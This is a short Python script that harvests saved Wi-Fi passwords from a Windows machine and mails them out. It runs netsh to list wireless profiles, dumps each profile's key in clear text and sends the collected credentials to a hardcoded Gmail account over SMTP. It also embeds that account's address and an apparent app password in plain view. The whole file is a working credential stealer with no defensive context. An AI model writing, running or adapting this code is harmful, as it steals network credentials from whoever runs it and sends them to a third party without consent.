import smtplib,sys,subprocess,re
def send_mail(email,password,msg):
    server=smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,msg)
    server.quit()
result=""
networks=subprocess.check_output("netsh wlan show profile", shell=True)
# print(networks.decode('utf8'))
networks_list=re.findall(r"(?:Profile\s*:\s)(.*?)(?:\\r)",str(networks))
# print(networks_list)
for network in (networks_list):
    # print(network)
    command="netsh wlan show profile "+str(network)+" key=clear"
    try:

        network_result=subprocess.check_output(command,shell=True)
    except subprocess.CalledProcessError as e:
        pass
    result=result+(network_result.decode('utf8'))
# print(type(result))
send_mail("mittal891604@gmail.com","rcudeucbnjnlpigl",result)